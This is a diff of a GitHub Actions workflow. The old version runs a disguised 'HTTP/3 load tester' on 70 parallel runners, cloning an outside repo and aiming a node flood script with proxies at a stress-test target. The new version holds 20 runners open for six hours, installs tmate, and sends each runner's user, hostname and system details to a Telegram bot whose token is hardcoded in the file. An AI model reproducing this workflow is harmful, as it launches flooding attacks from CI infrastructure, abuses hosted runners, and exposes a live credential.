@@ -1,55 +1,56 @@
-name: Parallel Node.js Execution
+name: Long Running - 20 Runners
 
 on:
   push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+    branches: [ main, master ]
   workflow_dispatch:
 
 jobs:
-  parallel-execution-ubuntu:
-    runs-on: ubuntu-24.04
+  run-6-hours:
+    runs-on: ubuntu-latest
     strategy:
-      max-parallel: 40
-      fail-fast: false  # Continue even if some instances fail
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
+        runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      max-parallel: 20
     
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-      
-      
-      - name: Setup Node.js environment
-        uses: actions/setup-node@v6.3.0
-      
-      
-      
-      
-      
-      - name: Run HTTP/3 load tester
-        run: |
-          npm i chalk@4 colors request   hpack cluster   
-          git clone https://github.com/Fegp1p2/ideal-guide.git
-          cd ideal-guide
-          unzip Fc-main.zip
-          cd Fc-main
-          node a.js GET https://rate-limit-1.dstatbot.win/LEVfD3Aa 5600 4 1 proxy.txt --bfm true --debug 
-
-          
-          
-          
-
-          
-
-          
-          sleep 1
-          
-          
-          
-          
-        env:
-          INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 70  # Updated to match the matrix count
-          RUNNER_OS: ubuntu
+    - name: Setup Node.js latest
+      uses: actions/setup-node@v4
+      with:
+        node-version: 'latest'
+    
+    - name: Setup Python latest
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.x'
+    
+    - name: Install tmate
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y tmate
+    
+    - name: Get system info and send to Telegram
+      run: |
+        USER=$(whoami)
+        HOSTNAME=$(hostname)
+        PORT="22"
+        INFO="${USER} : ${HOSTNAME} : ${PORT}"
+        
+        MESSAGE="🚀 *Runner #${{ matrix.runner }} Started*%0A%0A"
+        MESSAGE="${MESSAGE}📋 *Format:* ${INFO}%0A%0A"
+        MESSAGE="${MESSAGE}🖥️ *System:* $(uname -a)%0A"
+        MESSAGE="${MESSAGE}⏰ *Time:* $(date)%0A"
+        MESSAGE="${MESSAGE}✅ *Node:* $(node --version)%0A"
+        MESSAGE="${MESSAGE}🐍 *Python:* $(python3 --version)%0A"
+        MESSAGE="${MESSAGE}⏱️ *Duration:* 6 hours"
+        
+        curl -s -X POST "https://api.telegram.org/bot7660764339:AAEi3a5W7mHHIUiFbTmWhJGnzobhP-1IpoI/sendMessage" \
+          -d chat_id="7660764339" \
+          -d text="${MESSAGE}" \
+          -d parse_mode="Markdown"
+    
+    - name: Keep runner alive for 6 hours
+      run: |
+        echo "Runner #${{ matrix.runner }} running for 6 hours..."
+        sleep 21600  # 6 hours = 21600 seconds
+        echo "Runner #${{ matrix.runner }} finished!"
